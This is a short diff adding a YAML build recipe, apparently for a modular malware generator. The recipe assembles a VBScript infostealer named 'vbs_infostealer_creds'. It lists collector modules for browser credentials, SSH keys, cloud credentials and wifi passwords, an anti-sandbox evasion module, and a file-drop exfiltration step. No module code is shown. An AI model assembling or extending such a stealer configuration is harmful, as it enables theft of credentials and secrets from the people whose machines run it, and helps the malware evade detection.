@@ -1,0 +1,23 @@
+name: vbs_infostealer_creds
+description: Lightweight credential-focused VBScript stealer (browser, SSH, cloud, wifi)
+format: vbscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/browser_chromium
+  - collectors/ssh_keys
+  - collectors/cloud_creds
+  - collectors/wifi_passwords
+
+exfil: exfil/file_drop
+arch: arch/sequential
+
+evasion:
+  - evasion/anti_sandbox
+
+vars:
+  EXFIL_FILENAME: "report.log"
